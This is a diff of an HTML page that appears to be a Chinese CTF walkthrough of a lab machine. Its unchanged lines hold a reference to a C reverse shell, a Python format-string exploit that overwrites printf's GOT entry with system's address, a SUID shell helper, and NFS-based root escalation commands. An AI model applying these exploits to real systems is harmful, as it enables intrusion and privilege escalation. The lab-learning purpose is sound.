@@ -7589,7 +7589,7 @@
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595211683436-9fa05675-3ddf-4659-8b11-79c8d5bfa726-221444.png" /></p>
 <p>他是向 submit.php 发送代码的</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595212386049-ecea2721-47b7-411b-ae41-0727c544b33b-829753.png" /></p>
-<p>他说他会去执行代码，但是我只试了 php 的，wp 说是 C 语言的，找了个 C 语言的 shell
+<p>他说他会去执行代码，但是我只试了 php 的，wp 说是 C 语言的，找了个 C 语言的 shell<br />
 <a href="https://www.mi1k7ea.com/2019/03/24/C%25E7%25BC%2596%25E5%2586%2599%25E5%25AE%259E%25E7%258E%25B0Linux%25E5%258F%258D%25E5%25BC%25B9shell/">https://www.mi1k7ea.com/2019/03/24/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0Linux%E5%8F%8D%E5%BC%B9shell/</a></p>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
@@ -7649,13 +7649,13 @@ void main(int argc, char const *argv[])
 <p>靶机上 ASRL 是开着的</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595214860093-75b591b1-2218-4ea0-88bb-25450f6d9c51-661323.png" /></p>
 <p>可以通过 ulimit -s unlimited 使得 ASLR 实际上没用</p>
-<p>emmm，在搞个 peda
-git clone https://github.com/longld/peda.git ~/peda
+<p>emmm，在搞个 peda<br />
+git clone https://github.com/longld/peda.git ~/peda<br />
 echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit</p>
 <p>gdb 调试看一下，得到 system 的地址</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595488000511-eb364dd4-412a-4e15-8638-220580a059cb-601892.png" /></p>
-<p>然后通过把 printf 的 got 的中的内容改成 system 的真实地址来拿到 shell
-printf@got：0x8049bfc
+<p>然后通过把 printf 的 got 的中的内容改成 system 的真实地址来拿到 shell<br />
+printf@got：0x8049bfc<br />
 system：0x40069060</p>
 <p>exp</p>
 <pre><code class="language-python">from pwn import *
@@ -7669,7 +7669,7 @@ payload+= &quot;%36952u%8$n&quot;+&quot;%44966u%9$n&quot;
 #14406
 print payload
 </code></pre>
-<p>额，靶机没有 pwntools
+<p>额，靶机没有 pwntools<br />
 稍改一下</p>
 <pre><code class="language-python">payload = &quot;&quot;
 payload += &quot;1\n&quot; # selection #1
@@ -7689,7 +7689,7 @@ int main()
     system(&quot;chmod 4777 /tmp/john&quot;);
 }
 </code></pre>
-<p>同时 <code>export PATH=$PATH:/home/mike</code> 不然那个 <code>Selection:</code> 不加 <code>./</code> 没法运行的
+<p>同时 <code>export PATH=$PATH:/home/mike</code> 不然那个 <code>Selection:</code> 不加 <code>./</code> 没法运行的<br />
 这时候 <code>python exp.py | ./my_first</code> 会在 /tmp 目录下生成 john</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595221708264-36721677-b43c-4037-8bbd-ac422b696be9-462092.png" /></p>
 <p>当程序拥有 john 的 suid 权限，以 mike 身份运行程序的时候 euid 会变成 john，这个时候再去使用 setreuid 交换 ruid 和 euid，就可以真正的变成 john 用户</p>
@@ -7705,18 +7705,18 @@ void main(int argc, char *argv[]) {
 <h2 id="nfsroot">nfs提权root</h2>
 <p>sudo -l 发现 nfs 不用密码就可以以 root 权限执行（后面操作怕把电脑弄乱了就在虚拟机上操作了）</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595231487392-f76080fe-b324-4b0f-a407-702850256a0c-116565.png" /></p>
-<p>启动：<code>sudo /usr/local/sbin/nfs start</code>
-然后在攻击机上创建一个用来挂载的文件夹
-<code>mkdir /mnt/pegasus</code>
-然后挂载上
+<p>启动：<code>sudo /usr/local/sbin/nfs start</code><br />
+然后在攻击机上创建一个用来挂载的文件夹<br />
+<code>mkdir /mnt/pegasus</code><br />
+然后挂载上<br />
 <code>mount -t nfs -o proto=tcp,port=2049 192.168.149.183:/opt/nfs /mnt/pegasus</code></p>
-<p>创建一个文件并且给他权限
-<code>touch /mnt/pegasus/hack_shell</code>
+<p>创建一个文件并且给他权限<br />
+<code>touch /mnt/pegasus/hack_shell</code><br />
 <code>chmod 777 /mnt/pegasus/hack_shell</code></p>
-<p>回到靶机，把 /bin/dash 拷过去
+<p>回到靶机，把 /bin/dash 拷过去<br />
 <code>cp /bin/dash /opt/nfs/hack_shell</code></p>
-<p>然后在攻击机上给他权限
-<code>chmod u+s /mnt/pegasus/hack_shell</code>
+<p>然后在攻击机上给他权限<br />
+<code>chmod u+s /mnt/pegasus/hack_shell</code><br />
 <code>chmod g+s /mnt/pegasus/hack_shell</code></p>
 <p>这样在靶机一执行，就能拿到 root 权限</p>
 <p><img alt="image.png" src="../img/JhJNmI_-4d7Il_qX/1595232297914-2e5e212d-aa4c-4146-9b3d-20fed1f88eb9-291363.png" /></p>
